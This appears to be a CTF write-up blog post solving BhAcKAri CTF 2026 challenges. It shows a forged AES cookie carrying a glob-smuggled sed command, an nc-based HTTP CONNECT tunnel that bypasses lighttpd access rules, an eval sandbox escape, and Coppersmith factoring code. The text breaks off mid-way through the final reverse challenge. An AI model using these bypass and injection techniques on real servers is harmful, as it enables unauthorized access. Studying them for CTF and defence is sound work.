---
title: "BhAcKAri CTF 2026 Writeup: All 8 Challenges Solved"
slug: "bhackari-ctf-2026-writeup"
description: "BhAcKAri CTF 2026 full writeup — all 8 challenges solved across web, misc, crypto, and reverse with detailed methodology and end-to-end exploit chains."
date: 2026-06-02T08:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "bhackari"
  - "bhackari ctf"
  - "ctf 2026"
  - "italian ctf"
  - "web exploitation"
  - "misc challenges"
  - "cryptography"
  - "reverse engineering"
  - "aes-256-cbc"
  - "http connect tunnel"
  - "lighttpd"
  - "v8 sandbox escape"
  - "lsb steganography"
  - "minecraft datapack"
  - "coppersmith small roots"
  - "howgrave-graham"
  - "pe loader"
  - "rc4"
  - "7zip"
series: ["BhAcKAri CTF 2026"]
keywords:
  - "bhackari ctf 2026 writeup"
  - "bhackari ctf writeup"
  - "bhackari ctf 2026"
  - "bhackari streaming service writeup"
  - "bhackari proxyproxy writeup"
  - "bhackari horses v8 writeup"
  - "bhackari last bacaro standing writeup"
  - "bhackari cake minecraft writeup"
  - "bhackari eepy coppersmith"
  - "bhackari mystery so writeup"
  - "bhackari dont unpack me writeup"
  - "lighttpd connect tunnel bypass"
  - "lighttpd url.access-deny bypass"
  - "aes cookie c2 ctf"
  - "patched d8 v8 eval escape"
  - "coppersmith partial prime ctf"
  - "howgrave-graham small roots lattice"
  - "minecraft datapack cipher ctf"
  - "minecraft scoreboard floor mod"
  - "7zip gethandlerproperty2 rc4 ctf"
  - "manual pe loader writeup"
toc: true
cover:
  image: "/images/articles/bhackari-ctf-2026-writeup.png"
  alt: "BhAcKAri CTF 2026 writeup — all 8 challenges across web, misc, crypto, and reverse engineering"
---

{{< ctf-meta platform="BhAcKAri CTF 2026" difficulty="Mixed (Easy → Hard)" os="Jeopardy — Web, Misc, Crypto, Reverse (Italian event)" skills="JavaScript deobfuscation + AES-256-CBC cookie C2 + sed shell-glob bypass, lighttpd HTTP CONNECT tunneling past url.access-deny, patched d8 V8 sandbox eval escape via shop-trusted credits, seed-keyed LSB steganography with shuffle order, Minecraft 1.21.10 .mcfunction Vigenère with floor-mod, Coppersmith partial-prime small-roots via Howgrave-Graham lattice, deterministic Python C-extension stage chain with SHA-256/CRC32 key derivation, manual Windows PE loader with 4-byte patches into 7-Zip's GetHandlerProperty2" >}}

This **CyberSecurity Elite** writeup breaks down **BhAcKAri CTF 2026**, an Italian-themed jeopardy event whose infrastructure lives on the `.it` TLD (`challs.ctf.bhackari.it`) and whose challenges drip with **Venetian flavour** — the name itself is a play on *bacari*, the small wine-and-cicchetti taverns of Venice. The 2026 edition runs eight challenges across four categories (Web, Misc, Crypto, Reverse) and rewards careful reading of source code, binary disassembly, and protocol logs in roughly equal measure.

This is the full master writeup. All eight challenges (`BhAcKAri Streaming Service`, `Proxyproxy`, `Horses`, `Last Bacaro Standing`, `Cake`, `Eepy`, `Mystery`, `Don't Unpack Me`) were solved end-to-end. Each section below covers the surface, the bug class, the exploit chain, and the recovered flag. Full per-challenge reproductions — solver scripts, AES key recovery, lattice setups, and PE loader traces — live in the source repository: [Abdelkad3r/bhackari-ctf-2026](https://github.com/Abdelkad3r/bhackari-ctf-2026).

## The event at a glance

| Category | Challenge                            | Core technique                                                                                              |
|----------|--------------------------------------|-------------------------------------------------------------------------------------------------------------|
| Web      | BhAcKAri Streaming Service           | Rot-14-obfuscated JS popunder → AES-256-CBC cookie C2 → forge `{"cmd":"sed -n p flag?txt"}` past sed whitelist |
| Web      | Proxyproxy *(nothing here pt. 2)*    | `lighttpd url.access-deny ( "debug" )` bypassed via `HTTP CONNECT /` → raw TCP tunnel → `POST /debug` |
| Misc     | Horses                               | Patched-d8 sandbox with `eval` still globally exposed; load-game accepts arbitrary credits → buy "🐴 Terminal" |
| Misc     | Last Bacaro Standing                 | Seed-keyed LSB stego on a Venetian *bacaro* photo; seed = `aciugheta` (the sign on the awning)               |
| Misc     | Cake                                 | Minecraft 1.21.10 datapack: 63-symbol additive Vigenère keyed by player UUID, **floor-mod** semantics       |
| Crypto   | Eepy                                 | RSA-2048 service leaks top 600 bits of `p`; bottom 424 < `N^(1/4)` → Coppersmith via Howgrave-Graham lattice |
| Reverse  | Mystery                              | Stripped Python C-extension; every layer deterministic from SHA-256/CRC32 of the .so itself; AES-256-CTR     |
| Reverse  | Don't Unpack Me                      | 5,632-byte PE: manual loader patches 4 callbacks into inner PE; CRC32(`7z.dll!GetHandlerProperty2`) = RC4 key |

## Methodology — read the artefact, then read it again

Eight challenges across four very different categories — but every single one reduces to the same instruction: **read the artefact in front of you**. The four-step framework that carried this engagement:

1. **Surface inventory.** Files on disk, HTTP endpoints, response headers, embedded resources, decoy strings. The author has put hints in plain text (`/*This is for you Arturo*/`, `*"el seme che serve a 'sta magia… l'è proprio el nome del posto."*`, the `easy_access()` decoy flag inside `mystery.so`). Read every visible byte before guessing.
2. **Identify the keying material.** Half the challenges have a deterministic key sitting in the artefact itself: the AES key in the deobfuscated JS, the bacaro's name on the sign in the photo, the player UUID in the Minecraft world's NBT, `SHA-256(mystery.so)` of the very file you're given. Recovering the key is recovering the spec.
3. **Walk the protocol or pipeline.** Every challenge has a chain — `JS → cookie → C2 → shell glob`, `HTML → robots.txt → /secret_page → cookie → flag`, `outer PE → memcpy → import resolve → 4 patches → CRC32 → RC4`. Trace each step's input and output before reaching for an exploit.
4. **Invert.** Once the pipeline is in your head, every step has a textbook inversion: AES-256-CBC decrypt, shell glob expansion, base-63 modular subtraction with floor-mod, Coppersmith small-roots over a known partial prime, AES-256-CTR with a zero IV.

{{< callout type="info" title="The unifying lesson of BhAcKAri CTF 2026" >}}
Across the eight challenges, every "secret" is **derivable from material the player has been given**. The Venetian dialect brief tells you the seed is *"il nome del posto"* — and the bacaro's name is on its awning in the carrier photo. `mystery.so` *hashes itself* during init to derive its own AES key. The patched-d8 binary's `patch.diff` documents exactly which globals were removed (and which weren't). When you hit a wall, the answer is "I haven't read the artefact carefully enough yet."
{{< /callout >}}

---

## Web — BhAcKAri Streaming Service

`GET http://streaming.challs.ctf.bhackari.it:8000/` returns an anime streaming page that immediately runs a giant self-invoking script in `<head>`. The script wraps a property bag of two-letter keys in a `Proxy`-style `defineProperty` that **rot-14s every string value on access**:

```js
Object.entries({…}).reduce((a, i) => {
  Object.defineProperty(a, i[0], { get: () => /* rot-14 every string */ });
}, {});
```

Two comments and three decoded keys peel back the obfuscation:

| Comment / Key | Decoded |
|---|---|
| `/*This is for you Arturo*/` (`index.html`) | dev's nickname for the analyst |
| `/*use this abdul*/` (`player.html`) | the dev's other analyst's nickname |
| `/*ip da cambiare*/` | Italian for "IP to be changed" — pointing at the C2 host |
| `SI` | `streaming.challs.ctf.bhackari.it:5687` (a **sister C2 on port 5687**) |
| `cf` | `/ads` |
| `pld` | `payload` |

The deobfuscated logic, end-to-end:

```js
document.cookie = "payload=" + "<big hex string>";
// build a hidden <form method="POST" target="_blank"> and submit to
// http://streaming.challs.ctf.bhackari.it:5687/
```

The script sets a cookie on the streaming origin then pops a new tab POST'ing to the C2. Cookies aren't scoped by port, so the C2 receives the `payload=<hex>` cookie unchanged.

### The hidden `Fe()` function + the AES key leak

A function `Fe(e)` is defined but never called from the visible code. It walks its argument against a custom 81-char alphabet (`vo`) and emits ASCII. A *trailing string* sits next to `//from the sysadmin to abdul` — also rot-14'd because the proxy only rotates dictionary *values*, not raw literals. Feeding `Fe(rot14(trailing_string))` drops a tiny JSON note:

```jsonc
{
    "description": "Abdul, my friend, listen here, this is the last time
                    you forget the key, we can't afford to lose all the
                    datas we collected so far from user COOKIES",
    "algo":       "AES256",
    "key-uft-8":  "inshallah_nobody_will_steal_this",
    "IV":         "00000000000000000000000000000000",
    "Mode":       "CBC"
}
```

AES-256-CBC, all-zero IV, PKCS#7 padding, key `inshallah_nobody_will_steal_this`.

### The C2 evaluates `cmd` through a whitelisted shell

Decrypting the hex blob from the legitimate cookie reveals the popunder was trying to exfiltrate:

```jsonc
{
    "cmd": "sed -i -e '$a\\{...stolen_datas...}' logs.txt",
    "location": "IT",
    "zoneId": 8604706,
    "stolen_datas": "bla bla bla",
}
```

The `index.html` version's payload is even more on-the-nose:

> *"…I made the server accept only sed commands with letters and `{ ' ', '-', '?' }`. FIX IT. Oh, and DONT EVEN TRY to touch my flag.txt I blocked the world flag so KEEP OFF."*

So the C2 runs the `cmd` field through a shell *after* enforcing a whitelist: `[A-Za-z]`, space, `-`, `?`. The `flag.txt` file is excluded from world-readable.

### Forge a cookie of our own

The exploit chain: AES-256-CBC encrypt `{"cmd": "sed -n p flag?txt"}` with the leaked key + zero IV, hex-encode, set as `payload=…` cookie, POST to `http://…:5687/`. Why `sed -n p flag?txt` survives the whitelist:

- All characters in `sed -n p flag?txt` are letters, spaces, hyphens, or the literal `?`. ✓
- `?` is a **shell glob** that matches exactly one character. `flag?txt` expands to `flag.txt` (no other matches in the working directory).
- `sed -n p <file>` prints the file's contents.

Sed reads the file as `hasher` (the C2's process), which has read access to `flag.txt` — the dev's "blocked the world flag" only revoked the *other-user* permission. Flag returned:

**Flag:** `bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}`

**Web takeaway:** **shell glob characters are not punctuation; they are wildcards under whichever shell wraps the execve.** A whitelist that permits `?` while excluding `.` is a whitelist that permits any single-character match against any filename — including the very files the dev meant to exclude. The right fix is to `execve("/usr/bin/sed", argv)` directly (no shell), or to validate the *resolved* file path against an allowlist, not the source command.

---

## Web — Proxyproxy *(nothing here pt. 2)*

`GET http://proxy.challs.ctf.bhackari.it:3002/` returns the string `Nothing here`. The handout reveals a Flask backend hidden behind a `lighttpd` reverse proxy:

```python
# handout/backend/server.py
@app.get("/")
def root():
    return "Nothing here"

@app.post("/debug")
def debug():
    return f"Here is your flag!: {flag}"
```

```text
# handout/proxy/proxy.conf
server.modules = ("mod_proxy", "mod_access")

proxy.server = ( "/" => (( "host" => "backend", "port" => 8000 )) )

proxy.header = (
    "upgrade"      => "enable",
    "connect"      => "enable",
    "force-http10" => "enable",
)

url.access-deny = ( "debug" )
```

The Dockerfile builds `lighttpd` from HEAD of `lighttpd/lighttpd1.4`, so the running binary is `lighttpd/1.4.83-devel-…`.

### The filter is a suffix match, case-sensitive, decoded + normalised

Mapping the filter empirically:

```text
POST /debug          → 403 (lighttpd)
POST /Debug          → 404 (Flask: case-sensitive route)
POST /debug%20       → 404 (Flask: trailing space, no route)
POST /debug.         → 404
POST /debug/         → 403 (lighttpd normalises)
POST /xdebug         → 403 (suffix match — bingo)
POST /debugX         → 404 (no suffix match → passes proxy)
POST /a/../debug     → 403 (lighttpd normalises ../)
POST /%64ebug        → 403 (lighttpd %-decodes)
POST /debug%2f       → 403 (%2f decoded to /)
```

So lighttpd's `url.access-deny` does a *case-sensitive suffix match against the fully decoded, fully normalised path*. To reach Flask's `/debug` we need a path that **isn't** `…debug` after lighttpd's normalisation but **is** exactly `/debug` once Flask routes it. With both filters in play, that's impossible via straight HTTP.

### The two unusual `proxy.header` settings

The `proxy.header` block has two enables that don't appear in default lighttpd configs:

- `upgrade => enable` — forwards `Upgrade:` / `Connection: upgrade` headers and switches the connection to passthrough mode after a `101`. Flask never sends `101`, so dead end.
- `connect => enable` — **`mod_proxy` accepts the `HTTP CONNECT` verb** on URLs covered by a `proxy.server` rule and tunnels TCP through to the backend.

`CONNECT /` is the magic move. The path `/` matches `proxy.server = ("/" => …)` *and* doesn't end in `debug`, so lighttpd accepts it:

```bash
$ printf 'CONNECT / HTTP/1.1\r\nHost: x\r\n\r\n' | nc -q2 proxy.challs.ctf.bhackari.it 3002
HTTP/1.1 200 OK
Connection: close
Server: lighttpd/1.4.83-devel-…
```

After the `200`, lighttpd hands the TCP socket to the backend and stops parsing what comes through. The next bytes are delivered verbatim to Flask:

```text
client  ────CONNECT / HTTP/1.1───────►  lighttpd  ──TCP tunnel──►  Flask
client  ────POST /debug HTTP/1.0─────────────────────────────►   /debug
client  ◄───HTTP/1.0 200 + flag───────────────────────────────
```

Single TCP connection, two messages, no smuggling tricks needed.

**Flag:** `bhackariCTF{ed7b8baf6bd6341f194a95394c1acd314cee7871de0eb67c}`

**Web takeaway:** **`HTTP CONNECT` is a tunneling verb, not a proxying verb.** When `mod_proxy` accepts CONNECT on a non-internal URL, it loses the ability to inspect what flows after the `200 OK` handshake. The mitigation is either (a) disable `connect => enable` unless you're running an actual HTTPS forward proxy, or (b) restrict CONNECT to a `CONNECT $HOST:$PORT` form that doesn't match the backend's URL space. Setting `url.access-deny` on a URL pattern only protects HTTP request lines that lighttpd actually parses — once a CONNECT tunnel is open, all bets are off.

---

## Misc — Horses

The challenge shares its remote and attachment bundle with the pwn challenge *Engine-Powered Horses*, but for the misc variant only `ascii-horses.js` is in scope. The pwn track adds a V8 patch (`Array.prototype.max`) — irrelevant here.

```js
// ascii-horses.js
const FLAG_1 = "bhackariCTF{REDACTED_1}";
```

`FLAG_1` is a `const` in the top-level scope of the d8 script. Every function executed by the menu can see it. The task is to leak it from a patched-d8 sandbox that has had most file/network/Worker primitives removed.

### What survives in patched d8

The patch removes `read`, `readbuffer`, `load`, `writeFile`, `setTimeout`, `Realm`, `Worker`, `os`, `d8`, `performance`, and `printErr`. What's still on the global object: `print`, `readline`, `quit`, and **standard ECMAScript** — including `eval`.

### Two bugs in the JS

**Bug 1 — Load Game accepts arbitrary credits** (`ascii-horses.js:235`):

```js
else if (input === '5') {
    let payload = readline();
    let parsed = JSON.parse(payload);
    if (parsed.c !== undefined && parsed.s !== undefined) {
        credits = parsed.c;     // ← no range / type check
        ticket  = parsed.s;
    }
}
```

A save blob `{"c": 999999999, "s": []}` round-trips through `JSON.parse` and assigns straight onto the `credits` global. No HMAC, no sanity bound.

**Bug 2 — the Shop's "Terminal" item is a full `eval` loop** (`ascii-horses.js:387`):

```js
const SHOP_ITEMS = [
    { name: "Juan",           cost: 250,    action: "art"   },
    { name: "Side Eye Horse", cost: 500,    action: "art"   },
    { name: "🐴 Terminal 🐴", cost: 133700, action: "shell" }
];

function shellLoop() {
    while (true) {
        let cmd = readline();
        if (cmd.trim().toLowerCase() === "exit") break;
        try {
            let result = eval(cmd);   // ← arbitrary JS
            print(result);
        } catch(e) { … }
    }
}
```

### The exploit chain

1. Menu option **5** (Load Game) → paste `{"c": 999999999, "s": []}` → credits = 999,999,999.
2. Menu option **3** (Shop) → item **3** (🐴 Terminal 🐴) → costs 133,700 credits → enter shell loop.
3. Type `FLAG_1`. `eval("FLAG_1")` resolves the global `const` and `print` dumps it.

**Flag:** `bhackariCTF{C0rr1C4vall0o0!1!1!1}` *("Corri Cavallo!" — Italian for "Run, horse!")*

**Misc takeaway:** **`eval` in user-facing code is a sandbox escape primitive even when the surrounding sandbox is patched flat.** Removing `read` / `Worker` / `os` from a d8 patch doesn't matter if the application code that runs *inside* d8 calls `eval(readline())`. The bug isn't in V8 — it's in the JS the author shipped. Production lesson: any "developer terminal" / "admin console" feature whose backend is `eval` will be discovered and used.

---

## Misc — Last Bacaro Standing

The brief, in Venetian dialect, is a love-letter to the dying breed of true Venice *bacari* — the old wine-and-cicchetti taverns being squeezed out by tourist bars:

> *"el messagio no se vedi, ma xe dentro nei colori..."* — the message can't be seen, but it's inside the colours
>
> *"el seme che serve a 'sta magia… l'è proprio el nome del posto."* — the seed needed for this magic is the name of the place itself

The handout ships `bacaro.png` (the stego carrier), `enfilator.py` (the encoder, fully working), and `ciapator.py` (the decoder, deliberately a stub: *"Sto ciapator l'è ancora in osteria"* — "the decoder is still at the tavern").

### The encoder

```python
def infila_el_benedeto(quadro, messagio, dove_sbatto, semente):
    tela = Image.open(quadro).convert('RGB')
    pixels = list(tela.getdata())

    binari = ''.join(format(ord(l), '08b') for l in messagio) + '1111111111111110'

    posizioni = list(range(len(pixels) * 3))
    random.seed(semente)
    random.shuffle(posizioni)                          # ← seed-keyed permutation

    flat = [c for px in pixels for c in px]            # [R,G,B,R,G,B,…]
    for i, pos in enumerate(posizioni):
        if i >= len(binari): break
        flat[pos] = (flat[pos] & ~1) | int(binari[i])  # LSB patch
```

Three facts the decoder needs:
- Carrier converted to **RGB** before reading.
- Flat array is **R, G, B-interleaved** row-major — every channel is a candidate carrier, not just blue.
- Bits are written **in shuffle order**, not scan order. A naïve "read all LSBs left-to-right" gets 4.6 KB of garbage.
- Terminator is **`0xFFFE`** (16 bits) — never produced by an ASCII payload boundary alone.

### Identifying the seed

Open `bacaro.png`. The burgundy awning carries the bar's name in big white letters: **ACIUGHETA**. La Cantina Aciugheta is a real historic bacaro near Campo SS. Filippo e Giacomo, a couple of minutes from St Mark's Square — self-described as one of the oldest still running. That maps cleanly onto the brief's *"el più vecio… el più duro a morir"* ("the oldest, the hardest to kill") line.

Python's `random.seed` hashes the bytes of string inputs, so case matters. Trying variants:

```text
[seed='Aciugheta']           b..A .*.h0..TU|../...4...)…
[seed='aciugheta']           bhackariCTF{m4k3_b4cAr1_gr3at_4ga1n}    ← match
[seed='ACIUGHETA']           .z...EO. .|..:N..H)r..1…
[seed='Cantina Aciugheta']   ....(. @.."...LZ.1u..&…
```

Lowercase `aciugheta` wins. Replay the shuffle, read LSBs in shuffle order, repack bits to bytes, stop at the `0xFFFE` terminator.

**Flag:** `bhackariCTF{m4k3_b4cAr1_gr3at_4ga1n}`

**Misc takeaway:** **LSB stego with a seed-keyed shuffle is brute-forceable when the seed lives in the cover.** The challenge is honest about it — the brief tells you the seed is *"il nome del posto."* In an adversarial setting, an attacker walks every visible label, sign, EXIF field, watermark, and metadata string through `random.seed`. The defensive lesson, if you're inclined to ship steganography: the seed must come from somewhere the attacker can't observe (a KDF off a passphrase the user types). Otherwise it's a kid's puzzle.

---

## Misc — Cake (Minecraft datapack)

> *"My friend told me he made the world's most delicious cake, but he protected it with a password!"*

The handout is a **Minecraft Java Edition 1.21.10** world save. Booting it in adventure mode drops you in front of an anvil and a chest holding a single piece of paper. The datapack `ctf` rejects every renamed-paper input unless it matches a 20-character password from `[a-zA-Z0-9_]`. The flag is `bhackariCTF{<that-password>}`.

**You do not need to launch the game.** The whole validator is a stack of `.mcfunction` files plus the player's NBT — readable as text/binary from disk, reversible by hand.

### The cipher

`for.mcfunction`, trimmed to one iteration:

```text
# fetch one character of the input and look up its alphabet index
function ctf:gc   with storage ctf:data ctf.conv   # tmp := in[tmpi:tmpi2]
function ctf:gidx with storage ctf:data ctf.conv   # idx := idx[tmp]

# uidx = i % 4
scoreboard players operation $c tmpi %= $c const1  # const1 = 4

# read UUID[uidx] from the player's NBT
function ctf:gk with storage ctf:data ctf.conv     # k := @p.UUID[uidx]

# enc[i] = (idx + k) mod 63
scoreboard players operation $c k %= $c const2     # const2 = 63
scoreboard players operation $c idx += $c k
scoreboard players operation $c idx %= $c const2
function ctf:ak with storage ctf:data ctf.conv     # enc.append(idx)
```

The "alphabet" is the order of keys in `idx.mcfunction`:

```text
a → 0, b → 1, …, z → 25, A → 26, …, Z → 51, 0 → 52, …, 9 → 61, _ → 62
```

So the cipher is a **63-symbol additive Vigenère keyed by the four ints of the player's UUID**.

### The floor-mod twist

A critical subtlety: `%=` in Minecraft scoreboard arithmetic is **floor-mod (Python semantics), not Java's truncated `%`.** Using Java's `%` produces negative intermediate values that don't match any positive target in `prechk`, making positions 1..N appear unsolvable. Switching to floor-mod resolves every position cleanly.

```python
def floor_mod(a, b):                # Python's % already does this
    return a - b * (a // b)
```

### The expected ciphertext

`prechk.mcfunction` is twenty repetitions of an accumulator pattern: `tmp` starts at 29, deltas of ±N per position. Extracted target sequence:

```text
[29, 7, 29, 47, 29, 13, 35, 41, 23, 26, 28, 33, 23, 4, 54, 45, 20, 7, 28, 33]
```

### The exploit

Parse `playerdata/72c97782-…-d1ed.dat` with `nbtlib`:

```python
UUID = [1925805954, -557366980, -1859783841, -1036135955]
```

Invert each position:

```python
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
expected = [29, 7, 29, 47, 29, 13, 35, 41, 23, 26, 28, 33, 23, 4, 54, 45, 20, 7, 28, 33]
flag = "".join(alphabet[(enc - UUID[i % 4]) % 63] for i, enc in enumerate(expected))
# _c4n_i_h4v3_4_sl1c3_
```

**Flag:** `bhackariCTF{_c4n_i_h4v3_4_sl1c3_}`

**Misc takeaway:** **Minecraft datapacks are real source code.** Any `.mcfunction` you can read is a `.mcfunction` an attacker can read. The "puzzle" of this challenge is the floor-mod gotcha — Minecraft uses Python's `%` semantics, which differ from Java's truncated `%`. If you implement the cipher in Java, you'll see negative residues; if you implement it in Python, it just works. Defenders shipping game-mod-style content should treat datapack contents as fully public.

---

## Crypto — Eepy

> *"You're digging in the wrong place"* she said, then wrote something on the board and left, probably **smithing**.

The flavour text spells the attack out — *"smithing"* and *"digging in the wrong place"* both point to **Coppersmith**, and the *eepy/dream/blackboard* framing tells you the leaked value is *partial* (incomplete).

### The protocol

Connect to `nc eepy.challs.ctf.bhackari.it 10000`, send `1`. Service generates a fresh RSA-2048 keypair, prints:

```text
n: <2048-bit modulus>
e: 65537
And this weird number that I am sure it's not complete...
<partial>
Please help me!
```

Empirically, `<partial>` is **exactly 600 bits every session** — the top 600 bits of one prime `p` with the bottom 424 bits zeroed. Submit the correct `p`, get the flag.

### Why Coppersmith

`p` is a 1024-bit prime; we know its top 600 bits exactly. Write:

```text
p = p_high · 2^424 + x ,    0 ≤ x < 2^424
```

`p` divides `N = pq`, so `f(x) := p_high · 2^424 + x` is a **monic linear** polynomial with `f(x_0) ≡ 0 (mod p)`.

**Coppersmith's small-roots theorem:** for a degree-`d` monic polynomial with a root `x_0` modulo a divisor `p ≥ N^β`, we can recover `x_0` in polynomial time as long as `|x_0| < N^(β²/d − ε)`. Here `d = 1`, `β = ½` (because `p ≈ √N`), so the bound is `|x_0| < N^(1/4) ≈ 2^512`. Our unknown is at most `2^424` — comfortable headroom (88 bits of slack).

### The Howgrave-Graham lattice

Build the integer lattice of polynomials that vanish mod `p^m` at `x = x_0`:

```text
g_i(x) = N^(m−i) · f(x)^i        for i = 0..m         (m+1 rows)
h_j(x) = x^j     · f(x)^m        for j = 1..t          (t rows)
```

Why each vanishes mod `p^m`:
- `f(x_0) = p`, so `f(x_0)^i ≡ 0 (mod p^i)`. `N^(m−i)` contributes another `p^(m−i)` because `p | N`. Product `≡ 0 (mod p^m)`.
- For the shift rows `h_j`, `f(x_0)^m ≡ 0 (mod p^m)` directly.

Each polynomial `P_k(x)` is rewritten as `P_k(xX)` where `X = 2^424` is the bound on `x_0`. The coefficients become a row of an integer lattice. LLL-reduce; Howgrave-Graham's lemma guarantees the shortest reduced vector corresponds to a polynomial `h(x)` whose `x_0` is a root **over the integers**, not just modulo `p^m`.

With `m = t = 6` (lattice dimension 13), the run finishes in ~half a second on a laptop. Newton's method at high precision pins the integer root; divisibility by `N` verifies.

```python
def coppersmith_high_bits(N, p_high, shift, m=6, t=6):
    X = 1 << shift
    P = p_high << shift                   # constant of f(x)

    # f(x)^i = (P + x)^i, built incrementally
    f_pow = [[1]]
    for _ in range(m):
        prev = f_pow[-1]
        new = [0] * (len(prev) + 1)
        for k, c in enumerate(prev):
            new[k]     += c * P
            new[k + 1] += c
        f_pow.append(new)

    polys = []
    for i in range(m + 1):
        polys.append([c * (N ** (m - i)) for c in f_pow[i]])
    for j in range(1, t + 1):
        polys.append([0] * j + list(f_pow[m]))

    B = IntegerMatrix(len(polys), m + t + 1)
    for r, poly in enumerate(polys):
        for j, c in enumerate(poly):
            B[r, j] = int(c) * (X ** j)
    LLL.reduction(B)
    # … extract integer root, verify N % p == 0 …
```

**Flag:** `bhackariCTF{w0w_y0u_c4n_r34lly_sm1th}` *("wow you can really smith" — Coppersmith pun)*

**Crypto takeaway:** **never publish anything more than `N` and `e` if you can't guarantee the leak is below `N^(1/(d·β))`.** The 600-bit prefix of a 1024-bit prime leaves 424 unknown bits, well inside Coppersmith's `2^512` bound for the linear case. Production guidance: if a system *must* leak partial key material (e.g., a hardware fault tolerance scheme), make sure the leak is below the Boneh-Durfee or Coppersmith bound for your `(e, d, β)` tuple.

---

## Reverse — Mystery (Python C-extension)

```text
$ file mystery.so
ELF 64-bit LSB shared object, x86-64, dynamically linked, BuildID[sha1]=..., stripped
$ wc -c flag.enc
46 flag.enc
```

A stripped Python C-extension importing OpenSSL EVP (SHA-256 + AES-256-CTR) and the standard anti-debug toolkit (`ptrace`, `prctl`, `dladdr`, `LD_PRELOAD`/`LD_AUDIT` env checks). The module exposes four methods:

```python
import mystery
mystery.stage(index, value)   # submit a 32-bit stage value, index in 1..4
mystery.reveal()               # after 4 correct stages, decrypts flag.enc
mystery.easy_access()          # returns the DECOY flag
mystery.get_runtime_info()    # debug helper
```

`easy_access()` returns the literal `BhackariCTF{that_was_too_easy... or_was_it?}` — a fake "B" flag. The real flag starts with lowercase `bhackariCTF{...}` and comes from `reveal()`.

### Every layer is deterministic from `mystery.so`'s own bytes

The whole challenge can be solved **offline in pure Python with no execution of the binary**:

1. `sha = SHA-256(mystery.so)` — the module's `entry.init2 @ 0x2916` runs `dladdr → fopen → EVP_DigestUpdate` over its own file on disk.
2. `noise = CRC32(mystery.so)` — zlib's `crc32` matches the C code's hand-rolled final inversion.
3. `table0[64]` is derived from `sha` via a SplitMix-style mixer at `entry.init2`:

```python
state = 0
for i in range(32):                                       # phase 1
    state ^= sha[i] << ((i * 5) & 0x3f)
    state  = rol64(state, 7)
    state  = (state * 0x9e3779b97f4a7c15) & MASK64        # golden ratio
for j in range(64):                                       # phase 2
    state ^= state >> 7
    state ^= (state << 11) & MASK64
    state ^= state >> 3
    state  = (state * 0xd6e8feb86659fd93) & MASK64        # xorshift* multiplier
    table0[j] = (state >> ((j & 7) * 8)) & 0xff
```

4. The 4 stage check functions return deterministic values:

| Stage | Formula |
|------:|---------|
| 1 | `rol((t[7] \| t[10]<<8 \| t[13]<<16 \| t[16]<<24), 4)` |
| 2 | `rol((t[33] \| t[37]<<8), 2) ^ noise` |
| 3 | `((sha[3]<<24) \| (sha[4]<<16) \| (sha[5]<<8) \| sha[6]) ^ t[15]` |
| 4 | `mix((4 * 0x7f7f7f7f) ^ 0xdeadbeef) ^ t[44] ^ (t[57]<<8)` |

5. `stage()` stores `(value ^ 0xcafebabe) - index * 0x1234` at `0x62c0 + (i−1) * 4`.
6. `reveal()` chain-mixes the 4 stored secrets + `sha` + `noise` into a 32-byte AES key.
7. AES-256-CTR with that key and a **16-byte zero IV** decrypts `flag.enc`.

```bash
$ ./solve.py
bhackariCTF{F1n4lly_th4_My$t3rY_!S_$OlvEd!!!}
```

**Flag:** `bhackariCTF{F1n4lly_th4_My$t3rY_!S_$OlvEd!!!}`

**Reverse takeaway:** **anti-debug primitives don't protect content derived from the binary's own bytes.** `mystery.so`'s `dladdr → fopen → SHA-256(self)` step is the smoking gun — once you spot it, the whole keying material is reproducible offline without running the module. The `ptrace`/`LD_AUDIT`/`prctl` checks are decorative because none of them fire if you never `import mystery`.

---

## Reverse — Don't Unpack Me

```text
$ file dont_unpack_me.exe
PE32+ executable (GUI) x86-64, for MS Windows
$ wc -c dont_unpack_me.exe
5632 dont_unpack_me.exe
```

A 5,632-byte hand-crafted Windows PE. Section table:

| Idx | Name     | RawSize | RawPtr |
|----:|----------|--------:|-------:|
| 0   | `.text`  | 0x600   | 0x400  |
| 1   | `.rdata` | 0x200   | 0xa00  |
| 2   | `.data`  | 0       | 0      |
| 3   | `.x`     | 0xa00   | 0xc00  |

Section `.x` is a 2,560-byte blob whose first bytes are `4d 5a 90 00 03 00…` — **another PE32+ image**. Outer `.text` is suspiciously small (0x4c2 bytes) — a stub, not a real program.

### The intuitive trap

The natural move is to extract the inner PE from section `.x` and run it standalone. That yields *"Not there yet!"*. The real flag never lives in any single artefact — it's reassembled from bytes that have to be **found elsewhere on your system**, hence the literal `findme.dll` import.

### Five-layer treasure hunt

**Layer 1 — manual PE loader.** The outer's entry function (`0x1400013d0`) does the canonical manual-PE-loader dance: `GetModuleHandleA(NULL)` → walk sections looking for `.x` → `VirtualAlloc(MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)` → memcpy headers + sections → resolve imports via `LoadLibraryA` + `GetProcAddress`.

**Layer 2 — four 8-byte patches into the inner entry function.** The unusual move:

```nasm
0x140001576: mov [rax + 8],    rcx     ; ← patch 1 ← outer 0x140001034
0x140001581: mov [rax + 0x1b], rcx     ; ← patch 2 ← outer 0x140001054
0x14000158d: mov [rax + 0x2e], rcx     ; ← patch 3 ← outer 0x140001000
0x1400015a4: mov [rax + 0x3b], rcx     ; ← patch 4 ← outer 0x1400010b8
```

The inner PE's entry function has four 8-byte slots that the outer overwrites with callbacks into the *outer's own* `.text` — so the inner is intentionally broken without the outer's patches. That's why running the "unpacked" version dead-ends.

**Layer 3 — decode the procname.** Patch #2 (outer `0x140001054`) XORs 19 bytes of outer `.rdata` with 19 bytes of inner `.rdata`. Plaintext: **`GetHandlerProperty2`** — a well-known **7-Zip export**.

**Layer 4 — read the version hint.** Patch #3 (outer `0x140001000`) calls `GetFileVersionInfoA("findme.dll")` and checks `dwFileVersionLS == 0x00180009` — file version `*.*.24.9`. That's **7-Zip v24.09** (Nov 2024). So `findme.dll` is a renamed `7z.dll` v24.09 — and the flag bytes will be reconstructed from `GetHandlerProperty2`'s compiled machine code in that specific build.

